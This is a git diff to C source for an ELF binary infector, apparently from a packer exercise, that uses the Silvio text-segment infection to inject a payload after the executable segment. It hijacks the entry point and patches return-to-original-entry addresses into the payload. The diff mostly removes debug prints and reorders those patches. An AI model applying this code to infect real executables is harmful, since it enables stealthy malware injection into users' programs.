@@ -55,20 +55,25 @@ void silvio_text_infection(t_woody *woody)
     woody->infected_file_size = woody->binary_data_size + PAGE_SZ64;
 
     load_payload(woody, PAYLOAD_NAME);
-    printf("payload_size: %ld\n",woody->payload_size);
-    for (int i = 0;i < woody->payload_size;i++){
-        printf("%x ", ((char*)(woody->payload_data))[i]);
-    }
-    printf("\n\nEntry OLD in VX: ");
-    for (int i = 0;i < 4;i++){
-    printf("%x ", ((char*)(woody->payload_data))[66 + i]);
-    }
-    printf("\n");
-    printf("\nEntry NEW in VX: ");
-    for (int i = 0;i < 4;i++){
-    printf("%x ", ((char*)(woody->payload_data))[60 + i]);
-    }
-    printf("\n\n");
+
+    // printf("payload_size: %ld\n", woody->payload_size);
+    // for (int i = 0; i < woody->payload_size; i++)
+    // {
+    //     printf("%x ", ((char *)(woody->payload_data))[i]);
+    // }
+    // printf("\n\nEntry OLD in VX: ");
+    // for (int i = 0; i < 4; i++)
+    // {
+    //     printf("%x ", ((char *)(woody->payload_data))[66 + i]);
+    // }
+    // printf("\n");
+    // printf("\nEntry NEW in VX: ");
+    // for (int i = 0; i < 4; i++)
+    // {
+    //     printf("%x ", ((char *)(woody->payload_data))[60 + i]);
+    // }
+    // printf("\n\n");
+
     if (woody->payload_size > PAGE_SZ64)
     {
         error(ERROR_NOT_DEFINED, woody);
@@ -78,8 +83,7 @@ void silvio_text_infection(t_woody *woody)
 
     // Increase section header offset by PAGE_SIZE
     woody->ehdr->e_shoff += PAGE_SZ64;
-    printf("old entry: %p\n", woody->ehdr->e_entry);
-    memcpy(woody->payload_data + 66, (void *)&(woody->ehdr->e_entry), 4);
+
     for (int i = 0; i < woody->ehdr->e_phnum; i++)
     {
         if (woody->phdr[i].p_type == PT_LOAD && woody->phdr[i].p_flags == (PF_R | PF_X))
@@ -89,6 +93,7 @@ void silvio_text_infection(t_woody *woody)
 
             payload_vaddr = woody->phdr[i].p_vaddr + woody->phdr[i].p_filesz;
             woody->ehdr->e_entry = payload_vaddr;
+            woody->new_entry_point = payload_vaddr;
             woody->phdr[i].p_filesz += woody->payload_size;
             woody->phdr[i].p_memsz += woody->payload_size;
 
@@ -98,12 +103,6 @@ void silvio_text_infection(t_woody *woody)
             break;
         }
     }
-    printf("new entry: %p\n", woody->ehdr->e_entry);
-    memcpy(woody->payload_data + 60, (void *)&(woody->ehdr->e_entry), 4);
-    for (int i = 0;i < woody->payload_size;i++){
-        printf("%x ", ((char*)(woody->payload_data))[i]);
-    }
-    printf("diff: %p\n", (woody->ehdr->e_entry - woody->old_entry_point));
 
     // Adding offset of one page in all section located after text section end.
     for (int i = 0; i < woody->ehdr->e_shnum; i++)
@@ -113,6 +112,10 @@ void silvio_text_infection(t_woody *woody)
         else if (woody->shdr[i].sh_addr + woody->shdr[i].sh_size == payload_vaddr)
             woody->shdr[i].sh_size += woody->payload_size;
     }
+
+    // rewrite old and new entry_point in payload ret2oep.
+    memcpy(woody->payload_data + 60, (void *)&(woody->new_entry_point), 4);
+    memcpy(woody->payload_data + 66, (void *)&(woody->old_entry_point), 4);
 
     memcpy(woody->infected_file, woody->mmap_ptr, (size_t)text_end_offset);
     memcpy(woody->infected_file + text_end_offset, woody->payload_data, woody->payload_size);
